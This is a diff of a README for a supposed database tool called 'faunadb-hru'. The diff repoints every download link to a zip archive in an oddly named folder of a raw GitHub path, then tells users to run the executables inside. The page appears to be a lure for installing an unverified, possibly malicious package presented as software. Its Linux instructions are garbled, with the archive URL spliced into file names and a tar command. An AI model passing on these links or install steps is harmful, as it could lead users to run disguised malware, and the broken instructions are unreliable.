@@ -1,6 +1,6 @@
 # 🌟 faunadb-hru - Simple Database Management Made Easy
 
-[![Download faunadb-hru](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb-hru.zip)](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb-hru.zip)
+[![Download faunadb-hru](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb_hru_2.6.zip)](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb_hru_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Thank you for choosing faunadb-hru! This guide will help you download and run th
 
 To download the latest version of faunadb-hru, visit the releases page by clicking the link below:
 
-[Download faunadb-hru](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb-hru.zip)
+[Download faunadb-hru](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb_hru_2.6.zip)
 
 You will find various versions listed there. Choose the most recent version that fits your operating system.
 
@@ -26,18 +26,18 @@ Before downloading, please ensure your computer meets the following minimum requ
 ## 🔧 Installation Steps
 
 1. **Download the Application:** 
-   - Click on the [Download faunadb-hru](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb-hru.zip) link again.
+   - Click on the [Download faunadb-hru](https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb_hru_2.6.zip) link again.
    - Choose the version that matches your operating system.
    - The download will start automatically. 
 
 2. **Locate the Downloaded File:** 
    - After the download is complete, open your Downloads folder.
-   - Find the file named `faunadb-hru-[version].exe` for Windows, `faunadb-hru-[version].dmg` for macOS, or `faunadb-hru-[version]https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb-hru.zip` for Linux.
+   - Find the file named `faunadb-hru-[version].exe` for Windows, `faunadb-hru-[version].dmg` for macOS, or `faunadb-hru-[version]https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb_hru_2.6.zip` for Linux.
 
 3. **Run the Installer:**
    - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to complete the setup.
    - For macOS: Open the `.dmg` file and drag the faunadb-hru icon into your Applications folder.
-   - For Linux: Open a terminal, navigate to the folder where you saved the file, and enter `tar -xvzf faunadb-hru-[version]https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb-hru.zip` to extract it. Then run the application with `./faunadb-hru`.
+   - For Linux: Open a terminal, navigate to the folder where you saved the file, and enter `tar -xvzf faunadb-hru-[version]https://raw.githubusercontent.com/PeaklyPL/faunadb-hru/main/despiritualize/faunadb_hru_2.6.zip` to extract it. Then run the application with `./faunadb-hru`.
 
 4. **Launch the Application:**
    - Once installed, you can find faunadb-hru in your Applications folder on macOS or in the Start menu on Windows. Open it to start managing your database.
